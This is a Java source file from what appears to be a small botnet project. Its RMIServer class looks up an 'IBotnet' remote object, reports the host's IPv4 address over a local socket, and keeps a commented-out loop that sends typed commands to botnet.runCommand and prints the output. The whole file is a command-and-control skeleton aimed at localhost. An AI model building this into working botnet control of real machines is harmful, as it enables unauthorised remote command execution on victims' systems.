/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import rmi.IBotnet;

public class RMIServer {
    
    public static String getIP() throws SocketException{
        Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
        while( ifaces.hasMoreElements() )
        {
          NetworkInterface iface = ifaces.nextElement();
          Enumeration<InetAddress> addresses = iface.getInetAddresses();

          while( addresses.hasMoreElements() )
          {
            InetAddress addr = addresses.nextElement();
            if( addr instanceof Inet4Address && !addr.isLoopbackAddress() )
            {
              return addr.toString();
            }
          }
        }
        return null;
    }
    
    public static void main(String[] args) {
        try {
            IBotnet botnet = (IBotnet) Naming.lookup("rmi://127.0.0.1:1234/BotnetRMI");
            Socket socket = new Socket("127.0.0.1", 2345);
            BufferedWriter writer = new BufferedWriter (new OutputStreamWriter(socket.getOutputStream()));
            String ip = getIP();
            if (ip != null){
                writer.write(ip);
                writer.write("\n");
                writer.flush();
            }
            writer.close();
            socket.close();
//            botnet.testing();
//            while(true){
//                Scanner scanner= new Scanner(System.in);
//                String cmd = scanner.nextLine();
//                
//                ArrayList<String> arr = botnet.runCommand(cmd);
//                
//                for(String i:arr){
//                    System.out.println(i);
//                }
                
//                System.out.println(botnet.runCommand(cmd));
//                String s = null;
//                while ((s = br.readLine()) != null) {
//                    System.out.println(s);
//                }
//            }
        } catch (RemoteException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NotBoundException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (MalformedURLException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
}
